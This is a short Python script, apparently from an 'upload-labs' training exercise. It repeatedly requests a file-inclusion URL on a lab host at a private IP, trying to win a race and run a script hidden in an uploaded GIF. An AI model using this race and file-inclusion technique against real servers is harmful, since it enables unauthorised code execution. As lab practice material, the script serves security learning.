import requests
from threading import Thread

#url = "http://192.168.31.126:80/upload-labs/upload/NineteenFirstMethod.php.html"
url = "http://192.168.31.128:80/upload-labs/include.php?file=upload/NineteenScript.gif"

def request():
    global StatusCode
    global Text
    html = requests.get(url)
    StatusCode = html.status_code
    Text = html.text
    
while True:
    t = Thread(target=request())
    t.start()
    if StatusCode == 200:
        print(Text)
        print("OK")
        break
    else:
        print(StatusCode)